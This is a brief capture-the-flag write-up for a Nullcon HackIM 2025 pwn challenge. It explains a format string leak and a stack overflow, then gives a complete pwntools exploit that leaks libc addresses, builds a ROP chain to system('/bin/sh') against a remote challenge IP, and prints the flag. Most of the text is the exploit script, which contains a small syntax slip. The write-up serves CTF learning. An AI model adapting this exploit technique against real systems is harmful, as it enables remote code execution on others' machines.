
was an easy challenge from Nullcon Goa HackIM 2025 CTF

there was a format string bug in send_message function 

![fmtbug](https://github.com/user-attachments/assets/5988a3b2-0d51-49f0-b773-e2acfaaebe8e)

```
fgets(local_3f8,0x1000,stdin);
```
and our message was long enough to overwrite the saved_rip of the function...

no pie, no canary, leak the libc and do rop

as easy as it sounds


```
#!/usr/bin/env python3

from pwn import *
'''
p = gdb.debug("./hateful_patched", gdbscript="""
            b *send_message+91
            b *send_message+168
            b *send_message+185
            c
""")
'''python3
p = remote("52.59.124.14", 5020)

p.sendlineafter(b">>", b"yay")

payload = b"%lxA%lxA%lxA%lxA%lxA%lxA%lxA%lxA%lxA%lxA%lxA%lx"
p.sendlineafter(b">>", payload)
p.recvuntil(b"provided: ")
leak = p.recvline()
print(leak)
rip = int(leak[:12], 16) - 0x2588 + 0x4b10 
print(hex(rip))
libc = int(leak[24:][:12], 16) - 0x1d2000 - 0xa80
print(hex(libc))
system = libc + 0x4c490
nop = 0x4010ff
pop_rdi = libc +  0x00000000000277e5
binsh = libc + 0x196031
payload = b"A"*1016
payload += p64(nop)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b"message!\n", payload)
p.sendline(b"/bin" + p8(u8("/") + 1) + b"/sh")

p.interactive()
```

FLAG: ```ENO{W3_4R3_50RRY_TH4T_TH3_M3554G3_W45_N0T_53NT_T0_TH3_R1GHT_3M41L}```

***4rsp is pwning easy challs...***
